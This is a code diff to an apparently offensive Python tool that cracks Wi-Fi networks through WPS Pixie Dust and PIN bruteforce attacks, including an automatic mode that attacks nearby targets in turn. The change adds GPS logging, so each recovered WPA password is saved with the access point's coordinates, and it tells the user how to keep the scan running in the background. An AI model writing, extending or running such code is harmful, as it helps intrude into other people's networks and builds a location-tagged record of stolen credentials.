@@ -404,10 +404,11 @@ class BruteforceStatus:
 
 class Companion:
     """Main application part"""
-    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
+    def __init__(self, interface, save_result=False, print_debug=False, bssid='', save_location=False):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
+        self.save_location = save_location
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -603,22 +604,24 @@ class Companion:
         print(f"[+] WPA PSK: '{wpa_psk}'")
         print(f"[+] AP SSID: '{essid}'")
 
-    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
+    def __saveResult(self, bssid, essid, wps_pin, wpa_psk, latitude=None, longitude=None):
         if not os.path.exists(self.reports_dir):
             os.makedirs(self.reports_dir)
         filename = self.reports_dir + 'stored'
         dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
         with open(filename + '.txt', 'a', encoding='utf-8') as file:
-            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
-                        dateStr, bssid, essid, wps_pin, wpa_psk
-                    )
-            )
+            file.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n')
+            file.write(f'WPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n')
+            if latitude is not None and longitude is not None:
+                file.write(f'Latitude: {latitude}\nLongitude: {longitude}\n')
+            file.write('\n')
+
         writeTableHeader = not os.path.isfile(filename + '.csv')
         with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
             csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
             if writeTableHeader:
-                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
-            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
+                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK', 'Latitude', 'Longitude'])
+            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk, latitude, longitude])
         print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
 
     def __savePin(self, bssid, pin):
@@ -728,7 +731,11 @@ class Companion:
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+                latitude, longitude = None, None  # Default to None
+                if self.save_location:
+                    print("[i] Attempting to get GPS coordinates...")
+                    latitude, longitude = get_gps_location()
+                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk, latitude, longitude)
             if not pbc_mode:
                 # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -1181,7 +1188,7 @@ def auto_attack_mode(args):
 
             for target in prioritized_targets:
                 print(f"[*] Attacking {target['essid']} ({target['bssid']})")
-                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'])
+                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'], save_location=args.location)
                 if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force):
                     print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
                     stored_networks.add(target['bssid'])
@@ -1196,6 +1203,61 @@ def auto_attack_mode(args):
         except Exception as e:
             print(f"[!] An error occurred: {e}. Retrying...")
             time.sleep(10)
+
+def get_gps_location():
+    """
+    Retrieves GPS coordinates using the Termux API.
+    Returns (latitude, longitude) or (None, None) on failure.
+    """
+    try:
+        # Request a single, accurate GPS reading. Times out after 15 seconds.
+        result = subprocess.run(
+            ['termux-location', '-p', 'gps', '-r', 'once'],
+            capture_output=True,
+            text=True,
+            timeout=15,
+            check=True
+        )
+        location_data = json.loads(result.stdout)
+        latitude = location_data.get('latitude')
+        longitude = location_data.get('longitude')
+        print(f"[i] GPS location acquired: Lat {latitude}, Lon {longitude}")
+        return latitude, longitude
+    except FileNotFoundError:
+        print("[!] termux-api is not installed or not in PATH. Cannot get GPS location.")
+        return None, None
+    except subprocess.TimeoutExpired:
+        print("[!] GPS location request timed out. Make sure GPS is on and you have a clear view of the sky.")
+        return None, None
+    except (subprocess.CalledProcessError, json.JSONDecodeError) as e:
+        print(f"[!] Failed to get or parse GPS location: {e}")
+        return None, None
+
+def print_termux_location_guide():
+    """Prints a one-time guide for setting up Termux location services."""
+    guide_message = """
+    ---------------------------------------------------------------------
+    [i] LOCATION SAVING GUIDE
+    
+    To ensure GPS coordinates can be saved reliably, please check the
+    following settings on your Android device for BOTH the 'Termux'
+    and 'Termux:API' apps:
+
+    1.  ENABLE DEVICE LOCATION: Make sure your device's main GPS/Location
+        service is turned on.
+
+    2.  GRANT PERMISSIONS: In your Android App settings, grant "Location"
+        permission to both apps.
+
+    3.  ALLOW BACKGROUND ACTIVITY: To prevent Android from killing the
+        apps during a long scan, find the "Battery usage" setting for
+        both apps and set it to "Unrestricted".
+
+    This message will only be shown once. Starting in 5 seconds...
+    ---------------------------------------------------------------------
+    """
+    print(guide_message)
+    time.sleep(5)
 
 def ifaceUp(iface, down=False):
     if down:
@@ -1284,6 +1346,11 @@ if __name__ == '__main__':
         help='Run Pixie Dust attack'
         )
     parser.add_argument(
+        '-L', '--location',
+        action='store_true',
+        help='Save GPS location of the AP (requires termux-api)'
+        )
+    parser.add_argument(
         '-F', '--pixie-force',
         action='store_true',
         help='Run Pixiewps with --force option (bruteforce full range)'
@@ -1349,6 +1416,15 @@ if __name__ == '__main__':
 
     args = parser.parse_args()
 
+    if args.location:
+        # Check if the 'termux-location' command is available in the system's PATH
+        if not shutil.which('termux-location'):
+            die("ERROR: The --location flag was used, but 'termux-location' command was not found.\n"
+                "Please install the Termux API tools by running: pkg install termux-api")
+        else:
+            # If the command exists, show the user the setup guide one time.
+            print_termux_location_guide()
+
     if sys.hexversion < 0x03060F0:
         die("The program requires Python 3.6 and above")
     if os.getuid() != 0:
@@ -1370,7 +1446,7 @@ if __name__ == '__main__':
     else:
         while True:
             try:
-                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                companion = Companion(args.interface, args.write, print_debug=args.verbose, save_location=args.location)
                 if args.pbc:
                     companion.single_connection(pbc_mode=True)
                 else:
@@ -1386,7 +1462,7 @@ if __name__ == '__main__':
                         args.bssid = scanner.prompt_network()
 
                     if args.bssid:
-                        companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                        companion = Companion(args.interface, args.write, print_debug=args.verbose, save_location=args.location)
                         if args.bruteforce:
                             companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                         else:
